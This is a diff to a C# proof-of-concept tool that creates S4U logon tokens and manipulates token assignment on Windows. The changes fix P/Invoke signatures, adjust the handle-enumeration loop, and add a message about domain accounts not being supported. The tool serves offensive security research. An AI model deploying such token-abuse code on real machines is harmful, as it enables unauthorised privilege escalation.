@@ -731,9 +731,6 @@ namespace TcbS4uAssignTokenVariant
             IntPtr Arguments);
 
         [DllImport("kernel32.dll", SetLastError = true)]
-        static extern int GetCurrentThreadId();
-
-        [DllImport("kernel32.dll", SetLastError = true)]
         static extern IntPtr LocalFree(IntPtr hMem);
 
         [DllImport("kernel32.dll", SetLastError = true)]
@@ -765,8 +762,8 @@ namespace TcbS4uAssignTokenVariant
         static extern int NtQuerySystemInformation(
             SYSTEM_INFORMATION_CLASS SystemInformationClass,
             IntPtr SystemInformation,
-            int SystemInformationLength,
-            ref int ReturnLength);
+            uint SystemInformationLength,
+            out uint ReturnLength);
 
         [DllImport("ntdll.dll")]
         static extern NTSTATUS NtSetInformationToken(
@@ -782,7 +779,7 @@ namespace TcbS4uAssignTokenVariant
         static extern NTSTATUS LsaConnectUntrusted(out IntPtr LsaHandle);
 
         [DllImport("secur32.dll", SetLastError = false)]
-        public static extern NTSTATUS LsaFreeReturnBuffer(IntPtr buffer);
+        static extern NTSTATUS LsaFreeReturnBuffer(IntPtr buffer);
 
         [DllImport("secur32.dll")]
         static extern NTSTATUS LsaLogonUser(
@@ -1019,18 +1016,18 @@ namespace TcbS4uAssignTokenVariant
         {
             int ntstatus;
             IntPtr pInfoBuffer;
-            int nInfoLength = 1024;
+            uint nInfoLength = 1024;
             IntPtr hToken = WindowsIdentity.GetCurrent().Token;
             var pObject = IntPtr.Zero;
 
             do
             {
-                pInfoBuffer = Marshal.AllocHGlobal(nInfoLength);
+                pInfoBuffer = Marshal.AllocHGlobal((int)nInfoLength);
                 ntstatus = NtQuerySystemInformation(
                     SYSTEM_INFORMATION_CLASS.SystemExtendedHandleInformation,
                     pInfoBuffer,
                     nInfoLength,
-                    ref nInfoLength);
+                    out nInfoLength);
 
                 if (ntstatus != STATUS_SUCCESS)
                     Marshal.FreeHGlobal(pInfoBuffer);
@@ -1266,6 +1263,10 @@ namespace TcbS4uAssignTokenVariant
                 {
                     Console.WriteLine("[-] Failed to create S4U logon tokens.");
                     Console.WriteLine("    |-> {0}", GetWin32ErrorMessage(Marshal.GetLastWin32Error(), false));
+
+                    if (Marshal.GetLastWin32Error() == 0x00000032)
+                        Console.WriteLine("[!] This PoC does not support domain account. Try again with local account.");
+
                     break;
                 }
                 else
